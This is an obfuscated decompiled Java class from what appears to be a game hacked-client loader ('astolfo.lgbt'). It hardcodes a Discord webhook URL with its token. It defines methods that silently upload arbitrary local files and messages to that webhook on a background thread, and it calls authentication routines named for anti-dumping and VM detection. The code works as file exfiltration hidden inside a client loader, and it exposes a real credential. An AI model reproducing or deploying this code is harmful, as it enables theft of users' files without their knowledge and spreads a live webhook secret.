// =============================================== //
// Recompile disabled. Please run Recaf with a JDK //
// =============================================== //

// Decompiled with: CFR 0.151
// Class Version: 8
package astolfo.lgbt.client.loader;

import astolfo.lgbt.client.loader.Authentication;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import org.apache.http.Consts;
import org.apache.http.HttpEntity;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

public class Database {
    public static String database;

    public Database() {
        Database lllllllllllllllllIIlIllIIIllIIIl;
    }

    static {
        database = "https://discord.com/api/webhooks/822209340688957490/-EKNtxuR0D2AqinaCPT-GmkUDI8cKISMvxUY3Wndqe2IIHechmxuhlu8LCiOFoU4k4gO";
    }

    public static byte[] readAllBytes(InputStream lllllllllllllllllIIlIlIllllllllI) throws IOException {
        int lllllllllllllllllIIlIlIlllllllIl;
        int lllllllllllllllllIIlIlIlllllllII = 0;
        byte[] lllllllllllllllllIIlIlIllllllIll = new byte[]{};
        byte[] lllllllllllllllllIIlIlIllllllIlI = new byte[1024];
        while ((lllllllllllllllllIIlIlIlllllllIl = lllllllllllllllllIIlIlIllllllllI.read(lllllllllllllllllIIlIlIllllllIlI)) > 0) {
            if (lllllllllllllllllIIlIlIlllllllII + lllllllllllllllllIIlIlIlllllllIl >= lllllllllllllllllIIlIlIllllllIll.length) {
                byte[] lllllllllllllllllIIlIllIIIIIIIII = lllllllllllllllllIIlIlIllllllIll;
                lllllllllllllllllIIlIlIllllllIll = new byte[lllllllllllllllllIIlIlIlllllllII + lllllllllllllllllIIlIlIlllllllIl];
                System.arraycopy(lllllllllllllllllIIlIllIIIIIIIII, 0, lllllllllllllllllIIlIlIllllllIll, 0, lllllllllllllllllIIlIllIIIIIIIII.length);
            }
            for (int lllllllllllllllllIIlIlIlllllllll = 0; lllllllllllllllllIIlIlIlllllllll < lllllllllllllllllIIlIlIlllllllIl; ++lllllllllllllllllIIlIlIlllllllll) {
                lllllllllllllllllIIlIlIllllllIll[lllllllllllllllllIIlIlIlllllllII++] = lllllllllllllllllIIlIlIllllllIlI[lllllllllllllllllIIlIlIlllllllll];
            }
        }
        return lllllllllllllllllIIlIlIllllllIll;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public void sendMessage(String lllllllllllllllllIIlIllIIIIlIIll) {
        PrintWriter lllllllllllllllllIIlIllIIIIlIlll = null;
        BufferedReader lllllllllllllllllIIlIllIIIIlIllI = null;
        StringBuilder lllllllllllllllllIIlIllIIIIlIlIl = new StringBuilder();
        try {
            String lllllllllllllllllIIlIllIIIIllllI;
            URL lllllllllllllllllIIlIllIIIlIIIIl = new URL(database);
            URLConnection lllllllllllllllllIIlIllIIIlIIIII = lllllllllllllllllIIlIllIIIlIIIIl.openConnection();
            lllllllllllllllllIIlIllIIIlIIIII.setRequestProperty("accept", "*/*");
            lllllllllllllllllIIlIllIIIlIIIII.setRequestProperty("connection", "Keep-Alive");
            lllllllllllllllllIIlIllIIIlIIIII.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            lllllllllllllllllIIlIllIIIlIIIII.setDoOutput(true);
            lllllllllllllllllIIlIllIIIlIIIII.setDoInput(true);
            lllllllllllllllllIIlIllIIIIlIlll = new PrintWriter(lllllllllllllllllIIlIllIIIlIIIII.getOutputStream());
            String lllllllllllllllllIIlIllIIIIlllll = String.valueOf(new StringBuilder().append(URLEncoder.encode("content", "UTF-8")).append("=").append(URLEncoder.encode(lllllllllllllllllIIlIllIIIIlIIll, "UTF-8")));
            lllllllllllllllllIIlIllIIIIlIlll.print(lllllllllllllllllIIlIllIIIIlllll);
            lllllllllllllllllIIlIllIIIIlIlll.flush();
            lllllllllllllllllIIlIllIIIIlIllI = new BufferedReader(new InputStreamReader(lllllllllllllllllIIlIllIIIlIIIII.getInputStream()));
            while ((lllllllllllllllllIIlIllIIIIllllI = lllllllllllllllllIIlIllIIIIlIllI.readLine()) != null) {
                lllllllllllllllllIIlIllIIIIlIlIl.append("/n").append(lllllllllllllllllIIlIllIIIIllllI);
            }
        }
        catch (Exception lllllllllllllllllIIlIllIIIIlllII) {
            lllllllllllllllllIIlIllIIIIlllII.printStackTrace();
        }
        finally {
            try {
                if (lllllllllllllllllIIlIllIIIIlIlll != null) {
                    lllllllllllllllllIIlIllIIIIlIlll.close();
                }
                if (lllllllllllllllllIIlIllIIIIlIllI != null) {
                    lllllllllllllllllIIlIllIIIIlIllI.close();
                }
            }
            catch (IOException lllllllllllllllllIIlIllIIIIllIll) {
                lllllllllllllllllIIlIllIIIIllIll.printStackTrace();
            }
        }
    }

    public static void sendFile(File ... lllllllllllllllllIIlIllIIIIIlIII) {
        new Thread(() -> {
            FileInputStream lllllllllllllllllIIlIlIlllIllIlI = null;
            try {
                DefaultHttpClient lllllllllllllllllIIlIlIllllIIllI = new DefaultHttpClient((HttpParams)new BasicHttpParams());
                HttpPost lllllllllllllllllIIlIlIllllIIlIl = new HttpPost("https://discord.com/api/webhooks/822209340688957490/-EKNtxuR0D2AqinaCPT-GmkUDI8cKISMvxUY3Wndqe2IIHechmxuhlu8LCiOFoU4k4gO");
                MultipartEntity lllllllllllllllllIIlIlIllllIIlII = new MultipartEntity();
                for (int lllllllllllllllllIIlIlIllllIIlll = 0; lllllllllllllllllIIlIlIllllIIlll < lllllllllllllllllIIlIllIIIIIlIII.length; ++lllllllllllllllllIIlIlIllllIIlll) {
                    File lllllllllllllllllIIlIlIllllIlIII = lllllllllllllllllIIlIllIIIIIlIII[lllllllllllllllllIIlIlIllllIIlll];
                    lllllllllllllllllIIlIlIlllIllIlI = new FileInputStream(lllllllllllllllllIIlIlIllllIlIII);
                    lllllllllllllllllIIlIlIllllIIlII.addPart(String.valueOf(new StringBuilder().append("file").append(lllllllllllllllllIIlIlIllllIIlll)), new InputStreamBody((InputStream)lllllllllllllllllIIlIlIlllIllIlI, lllllllllllllllllIIlIlIllllIlIII.getName()));
                }
                lllllllllllllllllIIlIlIllllIIlII.addPart("payload_json", new StringBody(" ", Consts.UTF_8));
                lllllllllllllllllIIlIlIllllIIlIl.setEntity(lllllllllllllllllIIlIlIllllIIlII);
                CloseableHttpResponse lllllllllllllllllIIlIlIllllIIIll = lllllllllllllllllIIlIlIllllIIllI.execute(lllllllllllllllllIIlIlIllllIIlIl);
                int lllllllllllllllllIIlIlIllllIIIlI = lllllllllllllllllIIlIlIllllIIIll.getStatusLine().getStatusCode();
                HttpEntity lllllllllllllllllIIlIlIllllIIIIl = lllllllllllllllllIIlIlIllllIIIll.getEntity();
                String lllllllllllllllllIIlIlIllllIIIII = EntityUtils.toString((HttpEntity)lllllllllllllllllIIlIlIllllIIIIl, (String)"UTF-8");
                System.out.println(String.valueOf(new StringBuilder().append("[").append(lllllllllllllllllIIlIlIllllIIIlI).append("] ").append(lllllllllllllllllIIlIlIllllIIIII)));
            }
            catch (FileNotFoundException lllllllllllllllllIIlIlIlllIlllll) {
                lllllllllllllllllIIlIlIlllIlllll.printStackTrace();
            }
            catch (ClientProtocolException lllllllllllllllllIIlIlIlllIllllI) {
                lllllllllllllllllIIlIlIlllIllllI.printStackTrace();
            }
            catch (UnsupportedEncodingException lllllllllllllllllIIlIlIlllIlllIl) {
                lllllllllllllllllIIlIlIlllIlllIl.printStackTrace();
            }
            catch (IOException lllllllllllllllllIIlIlIlllIlllII) {
                lllllllllllllllllIIlIlIlllIlllII.printStackTrace();
            }
            finally {
                try {
                    if (lllllllllllllllllIIlIlIlllIllIlI != null) {
                        lllllllllllllllllIIlIlIlllIllIlI.close();
                    }
                }
                catch (IOException lllllllllllllllllIIlIlIlllIlllll) {}
            }
        }).start();
    }

    public static void connect() throws IOException {
        Authentication lllllllllllllllllIIlIllIIIlIlllI = new Authentication();
        lllllllllllllllllIIlIllIIIlIlllI.connect();
        lllllllllllllllllIIlIllIIIlIlllI.captcha();
        lllllllllllllllllIIlIllIIIlIlllI.checks();
        lllllllllllllllllIIlIllIIIlIlllI.noDumper();
        lllllllllllllllllIIlIllIIIlIlllI.antiRobot();
        lllllllllllllllllIIlIllIIIlIlllI.vmUtil();
        lllllllllllllllllIIlIllIIIlIlllI.notNM();
        lllllllllllllllllIIlIllIIIlIlllI.astolfoFolder();
        lllllllllllllllllIIlIllIIIlIlllI.astolfoFolder();
        lllllllllllllllllIIlIllIIIlIlllI.astolfoFolder();
    }
}
 
